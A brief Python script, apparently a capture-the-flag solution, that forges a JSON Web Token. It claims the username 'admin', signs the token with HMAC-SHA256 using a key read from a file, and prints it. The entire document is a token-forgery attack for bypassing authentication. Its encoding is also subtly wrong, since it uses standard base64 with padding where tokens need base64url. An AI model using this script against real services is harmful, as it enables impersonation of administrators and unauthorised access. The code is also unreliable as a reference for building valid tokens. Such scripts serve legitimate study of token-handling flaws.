import jwt
from codecs import encode, decode
import hmac 
import hashlib

key = open('key','rb').read()

header = b'{"typ":"JWT","alg":"HS256"}'
header = encode(header,'base64').strip()
payload = b'{"username":"admin"}'
payload = encode(payload,'base64').strip()
sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
sig = encode(sig, 'base64').strip()
jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig.decode())

print(jwt)
